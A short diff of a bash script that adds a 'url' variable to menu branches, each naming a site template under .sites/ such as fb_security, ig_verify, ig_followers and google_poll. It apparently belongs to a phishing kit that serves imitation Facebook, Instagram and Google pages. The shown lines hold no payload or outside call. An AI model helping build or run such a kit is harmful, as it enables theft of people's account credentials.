@@ -180,7 +180,7 @@ done
 ;;
 2)
 cd .sites/
-
+url="fb_advanced"
 cd fb_advanced
 local
 while true;
@@ -206,7 +206,7 @@ done
 ;;
 3)
 cd .sites/
-
+url="fb_security"
 
 cd fb_security
 local
@@ -233,6 +233,7 @@ done
 ;;
 4)
 cd .sites
+url="fb_messenger"
  
 
 cd fb_messenger
@@ -288,7 +289,7 @@ case $IG in
 1)
 
 cd .sites/
-
+url="instagram"
 
 cd instagram
 local
@@ -315,7 +316,7 @@ done
 ;;
 2)
 cd .sites/
-
+url="ig_followers"
 
 cd ig_followers
 local
@@ -343,7 +344,7 @@ done
 3)
 cd .sites
 
-
+url="insta_followers"
 cd insta_followers
 local
 
@@ -370,7 +371,7 @@ done
 ;;
 4)
 cd .sites/
-
+url="ig_verify"
 
 cd ig_verify
 local
@@ -425,7 +426,7 @@ case $GG in
 
 cd .sites/
 
-
+url="google"
 cd google 
 local
 ip
@@ -451,7 +452,7 @@ done
 ;;
 2)
 cd .sites/
-
+url="google_poll"
 
 cd google_poll
 local
@@ -479,6 +480,7 @@ done
 ;;
 3)
 cd .sites
+url="google_new"
 
 
 cd google_new
